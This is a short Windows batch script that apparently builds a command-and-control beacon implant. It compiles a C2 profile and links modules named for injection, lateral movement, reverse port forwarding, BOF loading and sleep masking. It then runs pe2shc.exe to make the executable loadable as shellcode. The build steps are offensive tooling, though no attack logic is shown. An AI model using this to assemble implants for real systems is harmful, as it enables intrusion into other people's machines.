set input=%1%
@echo off
mkdir release
clang++ --target=x86_64-pc-windows-msvc -c c2profile.cpp -o ./release/c2profile.o
clang++ --target=x86_64-pc-windows-msvc -L ./ beaconMain.cpp ./release/c2profile.o ./release/Utils.o ./release/rotation.o ./release/Global.o ./release/encrypt_decrypt.o ./release/common.o ./release/comm.o ./release/ChildBeacon.o ./release/BeaconX64.o ./release/BeaconTask.o ./release/BeaconSleep.o ./release/Beaconrportfwd.o ./release/BeaconLateralMovement.o ./release/BeaconJob.o ./release/BeaconInject.o ./release/BeaconFileManage.o ./release/BeaconBof.o -o ./release/o.exe
pe2shc.exe ./release/o.exe ./release/beacon.exe
echo "success" > %input%
exit